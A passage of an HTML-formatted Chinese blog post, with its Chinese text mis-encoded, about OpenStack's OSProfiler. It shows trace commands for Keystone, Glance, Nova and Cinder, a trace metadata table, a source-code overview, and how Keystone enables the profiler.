ä½œä¸ºåç«¯ï¼Œå¦‚æœç”¨ Elasticsearch æˆ– Jaeger ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ä¸å…¼å®¹ã€‚</p><img src="https://i.loli.net/2021/06/06/Gm1ycfj5qprEzBD.png" width="80%"><p>åœ¨ Gateway ä¸Šä½¿ç”¨ Docker éƒ¨ç½² MongoDB ï¼Œå­˜å‚¨è¿½è¸ªä¿¡æ¯ã€‚</p><img src="https://i.loli.net/2021/06/06/x7PacO2MGholgHu.png"><h2 id="è¿½è¸ªæœåŠ¡ç»„ä»¶"><a href="#è¿½è¸ªæœåŠ¡ç»„ä»¶" class="headerlink" title="è¿½è¸ªæœåŠ¡ç»„ä»¶"></a>è¿½è¸ªæœåŠ¡ç»„ä»¶</h2><p>æ˜¾å¼æŒ‡å®šè¿½è¸ªçš„è°ƒç”¨å‘½ä»¤</p><h3 id="Keystone-1"><a href="#Keystone-1" class="headerlink" title="Keystone"></a>Keystone</h3><p>èº«ä»½è®¤è¯æœåŠ¡ï¼Œåˆ—å‡ºæ‰€æœ‰ç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¸…é™¤ä¸´æ—¶ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³æƒé™è®¤è¯</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·</span></span><br><span class="line">openstack user list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡º html æ–‡ä»¶</span></span><br><span class="line">osprofiler trace show --html fdfa1e7a-0863-470b-8ae2-169b21b0fbe5 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test1.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Glance-1"><a href="#Glance-1" class="headerlink" title="Glance"></a>Glance</h3><p>é•œåƒæœåŠ¡ï¼Œåˆ—å‡ºå¯ç”¨é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¸…é™¤ä¸´æ—¶ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³æƒé™è®¤è¯</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºå¯ç”¨é•œåƒ</span></span><br><span class="line">openstack image list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡º html æ–‡ä»¶</span></span><br><span class="line">osprofiler trace show --html 04c4f7b5-e22f-40f7-8248-162247642cb5 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test2.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Nova-1"><a href="#Nova-1" class="headerlink" title="Nova"></a>Nova</h3><p>è®¡ç®—æœåŠ¡ï¼ŒæŸ¥è¯¢å®ä¾‹çŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¸…é™¤ä¸´æ—¶ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³æƒé™è®¤è¯</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®ä¾‹</span></span><br><span class="line">openstack server list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡º html æ–‡ä»¶</span></span><br><span class="line">osprofiler trace show --html 8cce121c-adf1-4061-96eb-950bb4a75db8 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test3.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Cinder-1"><a href="#Cinder-1" class="headerlink" title="Cinder"></a>Cinder</h3><p>å·æœåŠ¡ï¼ŒæŸ¥çœ‹å·çŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¸…é™¤ä¸´æ—¶ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³æƒé™è®¤è¯</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å·</span></span><br><span class="line">openstack volume list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡º html æ–‡ä»¶</span></span><br><span class="line">osprofiler trace show --html 71760b3d-df04-4fec-bc26-dfc9b909f518 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test4.html&quot;</span></span><br></pre></td></tr></table></figure><h2 id="å…ƒæ•°æ®åˆ†æ"><a href="#å…ƒæ•°æ®åˆ†æ" class="headerlink" title="å…ƒæ•°æ®åˆ†æ"></a>å…ƒæ•°æ®åˆ†æ</h2><p>trace point å¯ä»¥ç†è§£ä¸º span</p><table><thead><tr><th>å­—æ®µ</th><th>æ ¼å¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>info</td><td><code>&lt;dict&gt;</code></td><td>åœ¨è°ƒç”¨ profiler çš„ <code>start()</code> å’Œ <code>stop()</code> æ–¹æ³•æ—¶ä¼ é€’çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæ•°æ®åº“è¯­å¥ã€è¯·æ±‚å‚æ•°ç­‰</td></tr><tr><td>name</td><td>`<point_name>-(start</td><td>stop)`</td></tr><tr><td>service</td><td><code>&lt;service_name&gt;</code></td><td>public / api / osapi_compute</td></tr><tr><td>timestamp</td><td><code>&lt;timestamp&gt;</code></td><td>æ—¶é—´æˆ³</td></tr><tr><td>trace_id</td><td><code>&lt;uuid&gt;</code></td><td>å½“å‰è¿½è¸ªç‚¹id</td></tr><tr><td>project</td><td><code>&lt;project_name&gt;</code></td><td>æœåŠ¡ç»„ä»¶</td></tr><tr><td>parent_id</td><td><code>&lt;uuid&gt;</code></td><td>çˆ¶çº§è¿½è¸ªç‚¹id</td></tr><tr><td>base_id</td><td><code>&lt;uuid&gt;</code></td><td>æ‰€æœ‰å±äºä¸€æ¡è¿½è¸ªé“¾çš„è¿½è¸ªç‚¹éƒ½æ‹¥æœ‰ç›¸åŒçš„id</td></tr></tbody></table><h1 id="OSProfiler-æºç åˆ†æ"><a href="#OSProfiler-æºç åˆ†æ" class="headerlink" title="OSProfiler æºç åˆ†æ"></a>OSProfiler æºç åˆ†æ</h1><p>ç”¨ git æ‹‰å–æºç  <a href="https://github.com/openstack/osprofiler">openstack/osprofiler</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€devstack    <span class="comment"># DevStack è„šæœ¬ï¼Œå®‰è£…å’Œé…ç½® osprofiler</span></span><br><span class="line">â”œâ”€doc         <span class="comment"># æ–‡æ¡£</span></span><br><span class="line">â”œâ”€osprofiler  <span class="comment"># ä¸»è¦ä»£ç </span></span><br><span class="line">â”‚  â”‚  exc.py          <span class="comment"># cmd é”™è¯¯ç±»</span></span><br><span class="line">â”‚  â”‚  initializer.py  <span class="comment"># ï¼ˆè¯»å–é…ç½®æ–‡ä»¶ï¼‰åˆå§‹åŒ–</span></span><br><span class="line">â”‚  â”‚  notifier.py     <span class="comment"># é€šçŸ¥æ¶ˆæ¯</span></span><br><span class="line">â”‚  â”‚  opts.py         <span class="comment"># é…ç½®é€‰é¡¹</span></span><br><span class="line">â”‚  â”‚  profiler.py     <span class="comment"># osprofiler å®ä¾‹ï¼Œå‡½æ•°/ç±»è£…é¥°å™¨ï¼Œå…ƒæ•°æ®ç±»</span></span><br><span class="line">â”‚  â”‚  sqlalchemy.py   <span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br><span class="line">â”‚  â”‚  web.py          <span class="comment"># è¿½è¸ª WSGI è°ƒç”¨</span></span><br><span class="line">â”‚  â”‚  _utils.py       <span class="comment"># å·¥å…·å‡½æ•°</span></span><br><span class="line">â”‚  â”‚  __init__.py</span><br><span class="line">â”‚  â”œâ”€cmd      <span class="comment"># cmd æ¥å£</span></span><br><span class="line">â”‚  â”‚      cliutils.py   <span class="comment"># å‚æ•°è£…é¥°ã€ç»‘å®š</span></span><br><span class="line">â”‚  â”‚      commands.py   <span class="comment"># æ˜¾ç¤ºå’Œä¿å­˜æŒ‡å®šè·Ÿè¸ªï¼ˆhtml/json/dotï¼‰ï¼Œåˆ—å‡ºæ‰€æœ‰è·Ÿè¸ª</span></span><br><span class="line">â”‚  â”‚      shell.py      <span class="comment"># å¤„ç†å‘½ä»¤è¡Œ</span></span><br><span class="line">â”‚  â”‚      template.html <span class="comment"># html æ¨¡æ¿</span></span><br><span class="line">â”‚  â”‚      __init__.py</span><br><span class="line">â”‚  â”œâ”€drivers  <span class="comment"># é©±åŠ¨</span></span><br><span class="line">â”‚  â”‚      base.py   <span class="comment"># åŸºç±»</span></span><br><span class="line">â”‚  â”‚      elasticsearch_driver.py</span><br><span class="line">â”‚  â”‚      jaeger.py</span><br><span class="line">â”‚  â”‚      loginsight.py</span><br><span class="line">â”‚  â”‚      messaging.py</span><br><span class="line">â”‚  â”‚      mongodb.py</span><br><span class="line">â”‚  â”‚      redis_driver.py</span><br><span class="line">â”‚  â”‚      sqlalchemy_driver.py</span><br><span class="line">â”‚  â”‚      __init__.py</span><br><span class="line">â”‚  â”œâ”€hacking  <span class="comment"># é’ˆå¯¹ osprofiler ç¼–å†™çš„æµ‹è¯•</span></span><br><span class="line">â”‚  â””â”€tests    <span class="comment"># æµ‹è¯•</span></span><br><span class="line">â”œâ”€playbooks     <span class="comment"># Ansible å‰§æœ¬</span></span><br><span class="line">â”œâ”€releasenotes  <span class="comment"># å‘è¡Œè¯´æ˜</span></span><br><span class="line">â””â”€tools         <span class="comment"># ä»£ç é£æ ¼æ£€æŸ¥ï¼Œtox è™šæ‹Ÿç¯å¢ƒ</span></span><br></pre></td></tr></table></figure><p><strong>_utils.pyï¼ˆå·¥å…·å‡½æ•°ï¼‰</strong></p><ul><li>ç§æœ‰æ¨¡å—</li><li>å…¬æœ‰å‡½æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span>(<span class="params">text, strip=<span class="literal">True</span></span>):</span>                    <span class="comment"># åˆ†å‰²é€—å·åˆ†éš”çš„æ–‡æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_encode</span>(<span class="params">text, encoding=<span class="string">&quot;utf-8&quot;</span></span>):</span>      <span class="comment"># å°†æ–‡æœ¬è½¬æ¢ä¸ºäºŒè¿›åˆ¶ç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_decode</span>(<span class="params">data, encoding=<span class="string">&quot;utf-8&quot;</span></span>):</span>      <span class="comment"># å°†äºŒè¿›åˆ¶ç¼–ç è½¬æ¢ä¸ºæ–‡æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hmac</span>(<span class="params">data, hmac_key</span>):</span>              <span class="comment"># ç”¨ key äº§ç”Ÿ HMAC</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signed_pack</span>(<span class="params">data, hmac_key</span>):</span>                <span class="comment"># ç”¨ key æ‰“åŒ…å’Œç­¾åæ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signed_unpack</span>(<span class="params">data, hmac_data, hmac_keys</span>):</span>  <span class="comment"># è§£åŒ…æ•°æ®å¹¶éªŒè¯ç­¾å</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">itersubclasses</span>(<span class="params">cls, _seen=<span class="literal">None</span></span>):</span>            <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸ºå­ç±»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_modules_from_package</span>(<span class="params">package</span>):</span>       <span class="comment"># ä»åŒ…å¯¼å…¥æ¨¡å—å¹¶åŠ å…¥ç³»ç»Ÿæ¨¡å—</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shorten_id</span>(<span class="params">span_id</span>):</span>                        <span class="comment"># UUID è½¬æ¢ä¸º 64 ä½ ID</span></span><br></pre></td></tr></table></figure><p><strong>notifier.pyï¼ˆé€šçŸ¥æ¶ˆæ¯ï¼‰</strong></p><ul><li>é»˜è®¤ä½¿ç”¨åŸºæœ¬çš„é©±åŠ¨ç¨‹åº</li><li>æ ¹æ®å‚æ•°è®¾ç½®é©±åŠ¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_noop_notifier</span>(<span class="params">info, context=<span class="literal">None</span></span>):</span>         <span class="comment"># ä½¿ç”¨åŸºæœ¬çš„é©±åŠ¨ç¨‹åº</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notify</span>(<span class="params">info</span>):</span>                               <span class="comment"># ä¼ é€’ä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span>                                      <span class="comment"># è¿”å›å¯è°ƒç”¨å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">notifier</span>):</span>                              <span class="comment"># è®¾ç½®å¯è°ƒç”¨å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">connection_string, *args, **kwargs</span>):</span> <span class="comment"># æ ¹æ®å‚æ•°è®¾ç½®é©±åŠ¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_notifier_cache</span>():</span>                     <span class="comment"># æ¸…é™¤ç¼“å­˜</span></span><br></pre></td></tr></table></figure><p><strong>profiler.pyï¼ˆosprofiler å®ä¾‹ï¼Œå‡½æ•°/ç±»è£…é¥°å™¨ï¼Œå…ƒæ•°æ®ç±»ï¼‰</strong></p><ul><li>å‡½æ•°è£…é¥°å™¨ </li><li>ç±»è£…é¥°å™¨</li><li>å…ƒæ•°æ®ç±»</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span>                                            <span class="comment"># æ¸…é™¤å…¨å±€ ThreadLocal å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ensure_no_multiple_traced</span>(<span class="params">traceable_attrs</span>):</span>        <span class="comment"># ç¡®ä¿ä¸é‡å¤è·Ÿè¸ª</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">hmac_key, base_id=<span class="literal">None</span>, parent_id=<span class="literal">None</span></span>):</span>       <span class="comment"># åˆå§‹åŒ– osprofiler çº¿ç¨‹å®ä¾‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span>                                              <span class="comment"># è·å– osprofiler å®ä¾‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">name, info=<span class="literal">None</span></span>):</span>                             <span class="comment"># å¯åŠ¨ osprofiler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">info=<span class="literal">None</span></span>):</span>                                    <span class="comment"># åœæ­¢ osprofiler</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°è¿½è¸ªè£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace</span>(<span class="params">name, info=<span class="literal">None</span>, hide_args=<span class="literal">False</span>, hide_result=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">          allow_multiple_trace=<span class="literal">True</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç±»è¿½è¸ªè£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace_cls</span>(<span class="params">name, info=<span class="literal">None</span>, hide_args=<span class="literal">False</span>, hide_result=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              trace_private=<span class="literal">False</span>, allow_multiple_trace=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              trace_class_methods=<span class="literal">False</span>, trace_static_methods=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TracedMeta</span>(<span class="params"><span class="built_in">type</span></span>):</span>                                 <span class="comment"># å…ƒæ•°æ®</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trace</span>(<span class="params"><span class="built_in">object</span></span>):</span>                                    <span class="comment"># å°è£… osprofiler çº¿ç¨‹å®ä¾‹ï¼Œä½¿ç”¨ with è¯­å¥è°ƒç”¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_Profiler</span>(<span class="params"><span class="built_in">object</span></span>):</span>                                <span class="comment"># ç§æœ‰ç±»ï¼ˆæµ‹è¯•ç”¨ï¼‰</span></span><br></pre></td></tr></table></figure><p><strong>sqlalchemy.pyï¼ˆè¿½è¸ªæ•°æ®åº“è°ƒç”¨ï¼‰</strong></p><ul><li>ç›‘å¬è°ƒç”¨ï¼ˆè°ƒç”¨å‰ã€è°ƒç”¨åã€è°ƒç”¨é”™è¯¯ï¼‰</li><li>åŒ…è£…æ•°æ®åº“ä¼šè¯è¿æ¥</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tracing</span>(<span class="params">sqlalchemy, engine, name, hide_result=<span class="literal">True</span></span>):</span>    <span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ…è£…ä¼šè¯</span></span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_session</span>(<span class="params">sqlalchemy, sess</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_before_cursor_execute</span>(<span class="params">name</span>):</span>                               <span class="comment"># ä¼ é€’è¯­å¥åŠå‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_after_cursor_execute</span>(<span class="params">hide_result=<span class="literal">True</span></span>):</span>                    <span class="comment"># ä¼ é€’æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_error</span>(<span class="params">exception_context</span>):</span>                            <span class="comment"># ä¼ é€’é”™è¯¯ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p><strong>web.pyï¼ˆè¿½è¸ª WSGI è°ƒç”¨ï¼‰</strong></p><ul><li>ç­¾åå’Œæ‰“åŒ…è¯·æ±‚å¤´</li><li>WSGI ä¸­é—´ä»¶ç±»</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_trace_id_headers</span>():</span>     <span class="comment"># ç­¾åè¯·æ±‚å¤´å¹¶æ·»åŠ åˆ°å­—å…¸</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WsgiMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span>   <span class="comment"># WSGI ä¸­é—´ä»¶ç±»</span></span><br></pre></td></tr></table></figure><p><strong>initializer.pyï¼ˆè¯»å–é…ç½®æ–‡ä»¶åˆå§‹åŒ–ï¼‰</strong></p><ul><li>è¯»å–é…ç½®æ–‡ä»¶</li><li>è®¾ç½®é€šçŸ¥é©±åŠ¨</li><li>å¯ç”¨ä¸­é—´ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡é…ç½®æ–‡ä»¶ï¼Œè¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œé¡¹ç›®åç§°ï¼ŒæœåŠ¡åç§°ï¼Œä¸»æœºåç§°/IPï¼Œé€šçŸ¥å‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_from_conf</span>(<span class="params">conf, context, project, service, host, **kwargs</span>):</span></span><br></pre></td></tr></table></figure><p><strong>opts.pyï¼ˆé…ç½®é€‰é¡¹ï¼‰</strong></p><ul><li>è®¾ç½®é»˜è®¤é…ç½® </li><li>åˆ¤æ–­é…ç½®é€‰é¡¹</li><li>åˆ—å‡ºé…ç½®é€‰é¡¹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤é…ç½®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_defaults</span>(<span class="params">conf, enabled=<span class="literal">None</span>, trace_sqlalchemy=<span class="literal">None</span>, hmac_keys=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 connection_string=<span class="literal">None</span>, es_doc_type=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 es_scroll_time=<span class="literal">None</span>, es_scroll_size=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 socket_timeout=<span class="literal">None</span>, sentinel_service_name=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_trace_enabled</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_db_trace_enabled</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enable_web_trace</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disable_web_trace</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_opts</span>():</span></span><br></pre></td></tr></table></figure><h1 id="Keystone-å¯ç”¨-OSProfiler"><a href="#Keystone-å¯ç”¨-OSProfiler" class="headerlink" title="Keystone å¯ç”¨ OSProfiler"></a>Keystone å¯ç”¨ OSProfiler</h1><ol><li>æ•°æ®åº“ä¼šè¯åŒ…è£…</li><li>flask WSGI ä¸­é—´ä»¶åŒ…è£…</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">common/profiler.py    <span class="comment"># è¯»å–é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®é€šçŸ¥é©±åŠ¨ï¼Œå¯ç”¨ä¸­é—´ä»¶</span></span><br><span class="line">common/sql/core.py    <span class="comment"># åŒ…è£…æ•°æ®åº“ä¼šè¯</span></span><br><span class="line">conf/__init__.py      <span class="comment"># é»˜è®¤é…ç½®</span></span><br><span class="line">server/flask/core.py  <span class="comment"># åˆå§‹åŒ–ï¼Œè°ƒç”¨ common/profiler.py</span></span><br><span class="line">setup.cfg             <span class="comment"># è®¾ç½®ä¸­é—´ä»¶ WsgiMiddleware</span></span><br></pre></td></tr></table></figure><p>common/sql/core.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ osprofiler æ¨¡å—åŒ…è£…ä¼šè¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_wrap_session</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">        sess = osprofiler.sqlalchemy.wrap_session(sql, sess)</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_read</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        reader = enginefacade.reader</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reader = _get_main_context_manager().reader</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(reader.using(_get_context()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_write</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        writer = enginefacade.writer</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        writer = _get_main_context_manager().writer</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(writer.using(_get_context()))</span><br></pre></td></tr></table></figure><p>setup.cfg è®¾ç½® server ä¸­é—´ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keystone.server_middleware &#x3D;</span><br><span class="line">    cors &#x3D; oslo_middleware:CORS</span><br><span class="line">    sizelimit &#x3D; oslo_middleware:RequestBodySizeLimiter</span><br><span class="line">    http_proxy_to_wsgi &#x3D; oslo_middleware:HTTPProxyToWSGI</span><br><span class="line">    osprofiler &#x3D; osprofiler.web:WsgiMiddleware          &lt;--- 